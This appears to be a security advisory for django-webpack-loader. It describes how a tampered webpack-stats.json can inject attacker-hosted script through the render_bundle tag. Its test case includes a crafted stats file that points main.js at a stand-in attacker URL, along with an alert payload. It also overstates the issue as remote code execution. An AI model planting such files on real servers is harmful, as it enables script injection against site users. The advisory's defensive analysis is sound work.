### Vulnerability List

#### 1. Stats File Content Injection leading to Remote Code Execution

* Description:
    1. An attacker gains write access to the `webpack-stats.json` file on the server. This could be achieved through various means, such as exploiting another vulnerability in the deployment environment or through misconfiguration of file permissions.
    2. The attacker crafts a malicious `webpack-stats.json` file. This file is designed to inject a malicious JavaScript bundle into the web application. For example, the attacker can modify the `publicPath` or `path` of a JavaScript asset within the stats file to point to a JavaScript file hosted on an attacker-controlled server.
    3. The Django application, using `django-webpack-loader`, reads and parses this malicious `webpack-stats.json` file.
    4. When a user requests a page that uses the `render_bundle` template tag to include the manipulated JavaScript bundle, the template tag, based on the data from the malicious stats file, generates a `<script>` tag pointing to the attacker's malicious JavaScript file.
    5. The user's browser loads and executes the malicious JavaScript code from the attacker's server, leading to Remote Code Execution in the user's browser (Cross-Site Scripting - XSS).

* Impact:
    * **Remote Code Execution (XSS):**  The attacker can execute arbitrary JavaScript code in the context of the user's browser. This can lead to:
        * **Session Hijacking:** Stealing user session cookies and gaining unauthorized access to user accounts.
        * **Data Theft:** Accessing sensitive information displayed on the page or making API requests on behalf of the user.
        * **Website Defacement:** Modifying the content of the webpage displayed to the user.
        * **Redirection to Malicious Sites:** Redirecting users to phishing websites or sites hosting malware.
        * **Further Exploitation:** Using the XSS vulnerability as a stepping stone to further compromise the application or the user's system.

* Vulnerability Rank: critical

* Currently implemented mitigations:
    * None. The project code does not implement any mechanisms to validate the integrity or content of the `webpack-stats.json` file. It relies on the security of the deployment environment to protect this file.

* Missing mitigations:
    * **Stats File Integrity Verification:** Implement a mechanism to verify the integrity of the `webpack-stats.json` file. This could involve:
        * **Digital Signatures:** Generate a digital signature for the `webpack-stats.json` file during the webpack build process and verify this signature before loading the file in the Django application.
        * **Hash Verification:** Calculate a cryptographic hash of the `webpack-stats.json` file during build time and store it securely. Upon loading the stats file, recalculate the hash and compare it to the stored hash to ensure file integrity.
    * **Input Validation and Sanitization:** After loading and parsing the `webpack-stats.json` file, validate its content to ensure it conforms to the expected structure and data types. Sanitize or reject any unexpected or potentially malicious URLs, paths, or filenames found within the stats file. Specifically, validate that URLs are within expected domains and paths are within expected directories.
    * **Restrict File System Permissions:**  Ensure that the `webpack-stats.json` file is stored in a location with appropriately restricted file system permissions. The file should not be placed in a publicly writable directory and should only be accessible for reading by the application process.

* Preconditions:
    * The attacker must gain write access to the file system where the `webpack-stats.json` file is stored on the server.

* Source code analysis:
    * `webpack_loader/loaders.py` - `WebpackLoader.load_assets()`:
    ```python
    def load_assets(self):
        try:
            with open(self.config["STATS_FILE"], encoding="utf-8") as f:
                return json.load(f) # Vulnerability: json.load parses the file without content validation
        except IOError:
            raise IOError(
                "Error reading {0}. Are you sure webpack has generated "
                "the file and the path is correct?".format(self.config["STATS_FILE"])
            )
    ```
    * The `load_assets` function in `WebpackLoader` class reads the `STATS_FILE` path from the configuration and directly parses the JSON content using `json.load()`.
    * There is no validation of the content of the JSON file after parsing.
    * The parsed data, including asset paths and URLs, is used directly by the `render_bundle` and `webpack_static` template tags to generate HTML code.

* Security test case:
    1. **Setup:**
        * Deploy a Django application using `django-webpack-loader` in a test environment as described in the documentation.
        * Configure `django-webpack-loader` with a default configuration and ensure webpack builds the assets and generates `webpack-stats.json`.
        * Verify that the application correctly serves the JavaScript bundle using the `render_bundle` template tag.
    2. **Craft Malicious Stats File:**
        * Create a new file named `malicious-webpack-stats.json` with the following content. This file modifies the `publicPath` for `main.js` to point to an external attacker-controlled domain serving malicious JavaScript.
        ```json
        {
          "status": "done",
          "publicPath": "/static/",
          "chunks": {
            "main": [
              "main.js"
            ]
          },
          "assets": {
            "main.js": {
              "name": "main.js",
              "publicPath": "https://attacker.example.com/malicious.js",
              "path": "/path/to/original/main.js"
            }
          }
        }
        ```
        * Prepare a malicious JavaScript file (`malicious.js`) hosted at `https://attacker.example.com/malicious.js`. This file can contain JavaScript code to demonstrate the vulnerability, such as displaying an alert: `alert('XSS Vulnerability!')`.
    3. **Replace Stats File:**
        * Locate the `webpack-stats.json` file on the deployed server, as configured in the Django settings (`WEBPACK_LOADER['DEFAULT']['STATS_FILE']`).
        * Replace the original `webpack-stats.json` file with the crafted `malicious-webpack-stats.json` file.
    4. **Trigger Vulnerability:**
        * Access a page in the Django application in a web browser that uses the `{% render_bundle 'main' %}` template tag.
    5. **Verify XSS:**
        * Observe that an alert box with the message 'XSS Vulnerability!' is displayed in the browser. This confirms that the malicious JavaScript code from `https://attacker.example.com/malicious.js` was executed, demonstrating the Stats File Content Injection vulnerability leading to Remote Code Execution.
